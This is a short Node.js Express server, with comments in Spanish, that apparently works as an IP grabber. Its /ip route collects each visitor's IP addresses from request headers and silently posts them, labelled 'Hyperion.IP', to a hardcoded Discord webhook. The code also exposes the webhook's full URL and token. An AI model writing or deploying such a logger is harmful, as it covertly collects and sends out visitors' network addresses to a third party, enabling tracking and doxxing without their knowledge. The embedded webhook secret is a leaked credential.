const express = require("express");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Webhook directo (tu webhook de Discord)
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1457199874100432970/2MP1g97e4ngqalHL7L6GsFtkV2RAvFk2JAkHkspnzizKmQ7HKr8b77msdiGxE4YTIzTf";

// Servir archivos estáticos desde /public
app.use(express.static(path.join(__dirname, "public")));

// Ruta /ip
app.get("/ip", async (req, res) => {
  const raw = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
  const ips = raw.split(",").map(ip => ip.trim());

  // Responder al frontend primero
  res.json({ ips });

  // Construir mensaje para Discord
  const message = ips
    .map((ip, index) => `Hyperion.IP ${index + 1}: ${ip}`)
    .join("\n");

  // Enviar mensaje a Discord
  try {
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });
  } catch (err) {
    console.error("Error sending webhook:", err);
  }
});

// Levantar servidor
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
